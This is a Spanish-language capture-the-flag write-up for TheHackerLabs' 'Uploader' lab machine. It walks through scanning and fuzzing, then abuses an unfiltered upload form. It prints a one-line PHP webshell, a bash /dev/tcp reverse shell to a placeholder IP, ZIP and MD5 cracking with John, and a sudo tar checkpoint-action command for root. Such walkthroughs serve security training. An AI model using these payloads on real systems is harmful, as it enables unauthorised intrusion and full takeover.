---
layout: single
title: Uploader - TheHackerLabs
excerpt: "Esta es una máquina bastante sencilla. Después de analizar los escaneos, nos dedicamos a analizar la página web activa en el puerto 80. Vemos que es posible subir archivos de cualquier tipo y aplicamos Fuzzing para descubrir en qué directorio se guardan. Abusamos de esta carga de archivos sin filtros para cargar una Webshell de PHP, con la que logramos obtener una Reverse Shell, ganando acceso principal a la máquina víctima. Dentro, una pista nos indica la existencia de un archivo ZIP, que encontramos y crackeamos, obteniendo la contraseña de otro usuario codificada en MD5. Crackeamos la contraseña y nos logueamos como otro usuario de la máquina. Revisamos los privilegios de nuestro usuario y vemos que podemos usar el binario tar como Root. Utilizamos la guía de GTFOBins para encontrar una forma de escalar privilegios usando el binario tar, convirtiéndonos en Root."
date: 2025-10-08
classes: wide
header:
  teaser: /assets/images/THL-writeup-uploader/uploader.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Easy Machine
tags:
  - Linux
  - Web Enumeration
  - Fuzzing
  - Arbitrary File Upload
  - PHP Webshell
  - Cracking Hash
  - Cracking ZIP File
  - Cracking MD5 Hash
  - Abusing Sudoers Privileges On tar Binary
  - Privesc - Abusing Sudoers Privileges On tar Binary
  - OSCP Style
---
![](/assets/images/THL-writeup-uploader/uploader.png)

Esta es una máquina bastante sencilla. Después de analizar los escaneos, nos dedicamos a analizar la página web activa en el **puerto 80**. Vemos que es posible subir archivos de cualquier tipo y aplicamos **Fuzzing** para descubrir en qué directorio se guardan. Abusamos de esta carga de archivos sin filtros para cargar una **Webshell** de **PHP**, con la que logramos obtener una **Reverse Shell**, ganando acceso principal a la máquina víctima. Dentro, una pista nos indica la existencia de un **archivo ZIP**, que encontramos y crackeamos, obteniendo la contraseña de otro usuario codificada en **MD5**. Crackeamos la contraseña y nos logueamos como otro usuario de la máquina. Revisamos los privilegios de nuestro usuario y vemos que podemos usar el **binario tar** como **Root**. Utilizamos la **guía de GTFOBins** para encontrar una forma de escalar privilegios usando el binario tar, convirtiéndonos en **Root**.

Herramientas utilizadas:
* *ping*
* *nmap*
* *Wappalizer*
* *ffuf*
* *gobuster*
* *echo*
* *cat*
* *nc*
* *grep*
* *find*
* *which*
* *python3*
* *wget*
* *7z*
* *zip2john*
* *zipinfo*
* *JohnTheRipper*
* *su*
* *sudo*
* *tar*


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Webshell">Abusando de Carga de Archivos para Cargar Webshell de PHP</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#linEnum">Enumeración de la Máquina Víctima</a></li>
				<li><a href="#Cracking">Crackeando Archivo ZIP y Contraseña Codificada en MD5 de Usuario operatorx</a></li>
				<li><a href="#tar">Abusando de Permisos Sudoers Sobre Binario tar para Escalar Privilegios</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.160
PING 192.168.100.160 (192.168.100.160) 56(84) bytes of data.
64 bytes from 192.168.100.160: icmp_seq=1 ttl=64 time=3.02 ms
64 bytes from 192.168.100.160: icmp_seq=2 ttl=64 time=3.52 ms
64 bytes from 192.168.100.160: icmp_seq=3 ttl=64 time=2.19 ms
64 bytes from 192.168.100.160: icmp_seq=4 ttl=64 time=1.27 ms

--- 192.168.100.160 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3103ms
rtt min/avg/max/mdev = 1.274/2.502/3.523/0.854 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.160 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 22:01 CST
Initiating ARP Ping Scan at 22:01
Scanning 192.168.100.160 [1 port]
Completed ARP Ping Scan at 22:01, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:01
Scanning 192.168.100.160 [65535 ports]
Discovered open port 80/tcp on 192.168.100.160
Completed SYN Stealth Scan at 22:01, 10.17s elapsed (65535 total ports)
Nmap scan report for 192.168.100.160
Host is up, received arp-response (0.0013s latency).
Scanned at 2025-10-07 22:01:18 CST for 10s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<br>

Obtuvimos solo un puerto abierto, siendo el **puerto 80**, por lo que la intrusión será por una página web.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 80 192.168.100.160 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 22:03 CST
Nmap scan report for 192.168.100.160
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Uploader File Storage
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

<br>

El escaneo nos muestra el título de la página web, por lo que no parece solo ser la página por defecto de **Apache2**.

Vamos a analizarla.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura1.png">
</p>

Es una página dedicada a subir y guardar archivos en la nube.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura2.png">
</p>

No nos dice mucho.

Dándole clic al botón central para subir archivos, nos envía a una página de PHP que permite la subida de archivos:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura3.png">
</p>

Si revisamos el código fuente de esta página, no vemos algún mensaje que indique el tipo de archivos aceptados como un filtro o una sanitización a la hora de subirlos:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura4.png">
</p>

Aunque estas funciones pueden estar ocultas trabajando en el Backend.

Tratemos de subir un archivo de texto simple.

Créalo primero:
```bash
echo "Esto es un test" > test.txt

cat test.txt
Esto es un test
```

Ahora lo subimos y vemos la respuesta:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura5.png">
</p>

Observa que la página nos dan un ID para el archivo subido, que suponemos, es el nuevo nombre del archivo o algo relacionado con este.

El problema es que no sabemos a dónde se están subiendo, por lo que podemos aplicar **Fuzzing** para identificar directorios o archivos ocultos.

<br>

<h2 id="fuzz">Fuzzing</h2>

Al ver que la página fue creada en **PHP**, quizá existan más archivos de este tipo, así que enfoquemos el **Fuzzing** a esto.

Primero usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.160/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.160/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 3968, Words: 1429, Lines: 140, Duration: 29ms]
uploads                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 6ms]
upload.php              [Status: 200, Size: 3277, Words: 1202, Lines: 114, Duration: 7ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 15ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 42ms]
                        [Status: 200, Size: 3968, Words: 1429, Lines: 140, Duration: 111ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 509ms]
:: Progress: [882180/882180] :: Job [1/1] :: 238 req/sec :: Duration: [0:13:29] :: Errors: 689 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

<br>

Ahora probamos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.160 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.160
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 320] [--> http://192.168.100.160/uploads/]
/upload.php           (Status: 200) [Size: 3277]
/index.html           (Status: 200) [Size: 3968]
/server-status        (Status: 403) [Size: 280]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

<br>

En ambos casos, descubrimos el directorio `/uploads`.

Visitémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura6.png">
</p>

Encontramos dónde se están guardando nuestros archivos.

Si visitamos uno de esos directorios, encontraremos nuestro archivo de texto:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura7.png">
</p>

Entonces, es posible que podamos subir una **Webshell** de **PHP** que nos permita ejecutar comandos y así, podríamos mandarnos una **Reverse Shell**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Webshell">Abusando de Carga de Archivos para Cargar Webshell de PHP</h2>

Primero crearemos la **Webshell** de **PHP**:
```bash
cat webshell.php
<?php
	system($_GET['cmd']);
?>
```

Ahora la cargamos a la página web:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura8.png">
</p>

Nuestro archivo se subió exitosamente, lo que indica que no hay ningún filtro para los archivos subidos.

Revisamos el directorio `/uploads` y ahí encontraremos nuestra **Webshell**:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura9.png">
</p>

Entramos a la **Webshell** y usamos el parámetro **cmd** que usamos en el script para ejecutar comandos:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura10.png">
</p>

Excelente, funciona.

Intentemos mandarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Usa la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Y ejecútala en la **Webshell**:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura11.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.160] 46926
bash: cannot set terminal process group (873): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Operator:/var/www/html/uploads/cloud_024ac6$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva para continuar:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="linEnum">Enumeración de la Máquina Víctima</h2>

Movámonos un poco para salir del directorio de la **Webshell**:
```bash
www-data@TheHackersLabs-Operator:/var/www/html/uploads/cloud_024ac6$ cd ../../
www-data@TheHackersLabs-Operator:/var/www/html$ ls
index.html  upload.php	uploads
```
Aquí encontramos los archivos de la página web.

Si revisamos el archivo **upload.php**, veremos el porqué es vulnerable:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ cat upload.php 
<?php
$upload_dir = "/var/www/html/uploads/";
$secret_folder = "cloud_" . bin2hex(random_bytes(3)); // Ej: cloud_a1b2c3

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['archivo'])) {
    if (!is_dir($upload_dir . $secret_folder)) {
        mkdir($upload_dir . $secret_folder, 0755, true);
    }
    
    $nombre_archivo = basename($_FILES['archivo']['name']);
    $archivo_tmp = $_FILES['archivo']['tmp_name'];
    
    if (move_uploaded_file($archivo_tmp, $upload_dir . $secret_folder . "/" . $nombre_archivo)) {
        $hash_archivo = substr(md5($nombre_archivo), 0, 8);
        $mensaje_exito = "<div class='alert success'>✅ Archivo procesado. ID: $hash_archivo</div>";
    } else {
        $mensaje_error = "<div class='alert error'>❌ Error en la subida</div>";
    }
}
?>
...
```
Observa que no hay ningún filtro a la hora de subir archivos, por lo que pudimos subir cualquier tipo y estos se ejecutan. Además, el ID que vimos al subir un archivo, solo es el nombre del archivo codificado en **MD5**.

Veamos qué usuarios existen en la máquina:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
operatorx:x:1000:1000:operator:/home/operatorx:/bin/bash
```
Solo hay un usuario aparte del **Root**.

Encontraremos el directorio de ese usuario en el directorio `/home`:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ ls -la /home
total 16
drwxr-xr-x  3 root      root      4096 Aug 19 21:49 .
drwxr-xr-x 23 root      root      4096 Aug  7 02:36 ..
-rw-r--r--  1 root      root        66 Aug 19 21:49 Readme.txt
drwxr-x---  5 operatorx operatorx 4096 Aug  8 17:43 operatorx
```
Sin querer, encontramos un archivo de texto.

Leámoslo:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ cat /home/Readme.txt 
He guardado mi archivo zip más importante en un lugar secreto.
```
Nos han dado una pista sobre un **archivo ZIP** oculto.

Podemos usar el comando **find** para buscar solo **archivos ZIP** en toda la máquina:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ find / -type f -name "*.zip"
find: '/etc/credstore.encrypted': Permission denied
find: '/etc/multipath': Permission denied
find: '/etc/ssl/private': Permission denied
...
find: '/boot/lost+found': Permission denied
/srv/secret/File.zip
find: '/lost+found': Permission denied
find: '/root': Permission denied
```
Encontramos un **archivo ZIP**.

Mandémoslo a nuestra máquina usando un servidor de **python3**.

Entra a ese directorio y levanta el servidor:
```bash
www-data@TheHackersLabs-Operator:/var/www/html$ cd /srv/secret/
www-data@TheHackersLabs-Operator:/srv/secret$ which python3
/usr/bin/python3
www-data@TheHackersLabs-Operator:/srv/secret$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Usa **wget** para descargar el **archivo ZIP** en tu máquina:
```bash
wget http://192.168.100.160:8080/File.zip
```
Intentemos descomprimirlo.

<br>

<h2 id="Cracking">Crackeando Archivo ZIP y Contraseña Codificada en MD5 de Usuario operatorx</h2>

Al intentar descomprimir este archivo, nos pedirá una contraseña:
```bash
7z x File.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_MX.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 430 bytes (1 KiB)

Extracting archive: File.zip
--
Path = File.zip
Type = zip
Physical Size = 430

    
Enter password (will not be echoed):
```
Entonces, tenemos que crackear este archivo para obtener la contraseña y así poder descomprimirlo.

Obtengamos el hash del **archivo ZIP**:
```bash
zip2john File.zip > hash
ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
```
Es un poco extraño, nos dice que el contenido no está encriptado.

Podemos analizar el **archivo ZIP** con la herramienta **zipinfo**:
```bash
zipinfo -v File.zip
Archive:  File.zip
...
...
Central directory entry #2:
---------------------------

  There are an extra -44 bytes preceding this file.

  Credentials/Credentials.txt

  offset of local header from start of archive:   42
                                                  (000000000000002Ah) bytes
  file system or operating system of origin:      Unix
  version of encoding software:                   6.3
  minimum file system compatibility required:     MS-DOS, OS/2 or NT FAT
  minimum software version required to extract:   5.1
  compression method:                             unknown (99)
  file security status:                           encrypted
...
```
Analizando el resultado, solo el archivo de texto dentro del **archivo ZIP** es el encriptado.

De igual forma, podemos crackear este archivo con el hash que obtuvimos y usando **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 64 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
121288           (File.zip/Credentials/Credentials.txt)     
1g 0:00:00:00 DONE (2025-10-07 23:01) 4.166g/s 25600p/s 25600c/s 25600C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Lo descomprimimos y leemos el archivo de texto:
```bash
7z x File.zip
...
Enter password (will not be echoed):
Everything is Ok

Folders: 1
Files: 1
Size:       67
Compressed: 430

cat Credentials/Credentials.txt
User: operatorx
       
Password: d0970714757783e6cf17b26fb8e2298f
```
Tenemos la contraseña del **usuario operatorx**.

Pero al usarla, nos dirá que es incorrecta:
```bash
www-data@TheHackersLabs-Operator:/srv/secret$ cd /home
www-data@TheHackersLabs-Operator:/home$ su operatorx
Password: 
su: Authentication failure
```
Analizando la contraseña, vemos que tiene la sintaxis de un **hash MD5**, por lo que podemos crackearlo con **JohnTheRipper** o con la página web **Crackstation**.

Hagámoslo de ambas formas.

Primero con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashMD5 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
112233           (?)     
1g 0:00:00:00 DONE (2025-10-07 23:07) 25.00g/s 4800p/s 4800c/s 4800C/s 123456..november
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Tenemos la verdadera contraseña.

Ahora solo le damos el hash a **Crackstation**:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura12.png">
</p>

Y listo, tenemos la contraseña otra vez.

Usémosla:
```bash
www-data@TheHackersLabs-Operator:/home$ su operatorx
Password: 
operatorx@TheHackersLabs-Operator:/home$ whoami
operatorx
```
Ya somos el **usuario operatorx**.

En su directorio encontraremos la flag del usuario:
```bash
operatorx@TheHackersLabs-Operator:/home$ cd operatorx/
operatorx@TheHackersLabs-Operator:~$ ls
user.txt
operatorx@TheHackersLabs-Operator:~$ cat user.txt
...
```

<br>

<h2 id="tar">Abusando de Permisos Sudoers Sobre Binario tar para Escalar Privilegios</h2>

Veamos qué privilegios tiene nuestro usuario:
```bash
operatorx@TheHackersLabs-Operator:~$ sudo -l
Matching Defaults entries for operatorx on TheHackersLabs-Operator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operatorx may run the following commands on TheHackersLabs-Operator:
    (ALL) NOPASSWD: /usr/bin/tar
```
Podemos usar el binario **tar** como **Root**.

Encontraremos una forma de escalar privilegios en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins: tar</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-uploader/Captura13.png">
</p>

Probémoslo:
```bash
operatorx@TheHackersLabs-Operator:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@TheHackersLabs-Operator:/home/operatorx# whoami
root
```
Listo, somos **Root**.

Obtengamos la última flag:
```bash
root@TheHackersLabs-Operator:/home/operatorx# cd /root
root@TheHackersLabs-Operator:~# ls
Congrats.txt  root.txt
root@TheHackersLabs-Operator:~# cat root.txt
...
```
La tenemos.

Y nos dejaron un bonito mensaje:
```bash
root@TheHackersLabs-Operator:~# cat Congrats.txt 
#########################################################
#    !FELICITACIONES!                                   #
#                                                       #
#    Has logrado escalar privilegios                    #
#    y obtener acceso root en la maquina Uploader.      #
#                                                       # 
#  A seguir aprendiendo con mas maquinas y practicando. #
#########################################################
```
Con esto, terminamos la máquina.


<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://crackstation.net/
* https://gtfobins.github.io/gtfobins/tar/


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
